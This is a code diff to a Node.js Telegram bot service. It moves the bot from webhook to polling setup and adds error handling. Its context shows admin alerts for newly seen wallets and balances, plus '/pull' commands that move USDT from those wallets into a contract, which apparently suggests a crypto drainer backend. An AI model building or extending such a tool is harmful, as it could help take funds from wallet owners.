@@ -1,6 +1,5 @@
 const TelegramBot = require('node-telegram-bot-api');
 const dotenv = require('dotenv');
-const express = require('express');
 
 dotenv.config();
 
@@ -8,51 +7,44 @@ class TelegramService {
     constructor() {
         this.bot = null;
         this.adminChatId = process.env.ADMIN_CHAT_ID;
-        this.webhookUrl = process.env.WEBHOOK_URL;
         this.botToken = process.env.TELEGRAM_BOT_TOKEN;
+        this.isInitialized = false;
     }
 
-    // Initialize with Express app for webhook
-    init(app) {
+    // Initialize without webhook server (Render handles this)
+    init() {
         if (!this.botToken) {
             console.log('⚠️ Telegram bot token not found, skipping bot initialization');
             return;
         }
         
-        // Use webhook instead of polling
-        this.bot = new TelegramBot(this.botToken, {
-            webHook: {
-                port: process.env.PORT || 3000,
-                host: '0.0.0.0'
+        try {
+            // Use polling for development, webhook for production
+            const useWebhook = process.env.NODE_ENV === 'production';
+            
+            if (useWebhook) {
+                // In production, Render handles webhook setup
+                // We just create the bot instance
+                this.bot = new TelegramBot(this.botToken);
+                console.log('✅ Telegram bot initialized (webhook mode)');
+            } else {
+                // In development, use polling
+                this.bot = new TelegramBot(this.botToken, { polling: true });
+                console.log('✅ Telegram bot initialized (polling mode)');
             }
-        });
-        
-        // Set webhook URL
-        if (this.webhookUrl) {
-            this.bot.setWebHook(`${this.webhookUrl}/telegram/${this.botToken}`);
-            console.log(`✅ Telegram webhook set to: ${this.webhookUrl}/telegram/${this.botToken}`);
+            
+            // Set up command handlers
+            this.setupCommandHandlers();
+            this.isInitialized = true;
+            
+        } catch (error) {
+            console.error('❌ Telegram bot initialization failed:', error.message);
         }
-        
-        // Register webhook route
-        if (app) {
-            this.setupWebhookRoute(app);
-        }
-        
-        // Set up command handlers
-        this.setupCommandHandlers();
-        
-        console.log('✅ Telegram bot initialized with webhook');
-    }
-
-    setupWebhookRoute(app) {
-        // Webhook endpoint for Telegram
-        app.post(`/telegram/${this.botToken}`, (req, res) => {
-            this.bot.processUpdate(req.body);
-            res.sendStatus(200);
-        });
     }
 
     setupCommandHandlers() {
+        if (!this.bot) return;
+
         // Start command
         this.bot.onText(/\/start/, (msg) => {
             this.sendWelcomeMessage(msg.chat.id);
@@ -93,9 +85,13 @@ Available commands:
 *Security Note:* Only authorized admins can execute sensitive commands\\.
         `;
         
-        return this.bot.sendMessage(chatId, message, {
-            parse_mode: 'MarkdownV2'
-        });
+        try {
+            return await this.bot.sendMessage(chatId, message, {
+                parse_mode: 'MarkdownV2'
+            });
+        } catch (error) {
+            console.error('Error sending welcome message:', error.message);
+        }
     }
 
     async sendNewWalletAlert(walletAddress, balance) {
@@ -112,9 +108,13 @@ Actions:
 • /pull\\_${escapedAddress} \\- Pull USDT to contract
         `;
         
-        return this.bot.sendMessage(this.adminChatId, message, {
-            parse_mode: 'MarkdownV2'
-        });
+        try {
+            return await this.bot.sendMessage(this.adminChatId, message, {
+                parse_mode: 'MarkdownV2'
+            });
+        } catch (error) {
+            console.error('Error sending new wallet alert:', error.message);
+        }
     }
 
     async sendBalanceAlert(walletAddress, balance) {
@@ -131,9 +131,13 @@ Actions:
 • /pull\\_${escapedAddress} \\- Pull USDT to contract
         `;
         
-        return this.bot.sendMessage(this.adminChatId, message, {
-            parse_mode: 'MarkdownV2'
-        });
+        try {
+            return await this.bot.sendMessage(this.adminChatId, message, {
+                parse_mode: 'MarkdownV2'
+            });
+        } catch (error) {
+            console.error('Error sending balance alert:', error.message);
+        }
     }
 
     async sendSuccessMessage(walletAddress, amount, txHash) {
@@ -149,9 +153,13 @@ Amount: *${amount} USDT*
 Transaction: \`${escapedTxHash}\`
         `;
         
-        return this.bot.sendMessage(this.adminChatId, message, {
-            parse_mode: 'MarkdownV2'
-        });
+        try {
+            return await this.bot.sendMessage(this.adminChatId, message, {
+                parse_mode: 'MarkdownV2'
+            });
+        } catch (error) {
+            console.error('Error sending success message:', error.message);
+        }
     }
 
     async handlePullCommand(chatId, walletAddress) {
@@ -220,7 +228,11 @@ Fetching wallet balances\\.\\.\\. This may take a moment\\.
 
     async sendMessage(chatId, message, options = {}) {
         if (!this.bot) return;
-        return this.bot.sendMessage(chatId, message, options);
+        try {
+            return await this.bot.sendMessage(chatId, message, options);
+        } catch (error) {
+            console.error('Error sending message:', error.message);
+        }
     }
 }
 
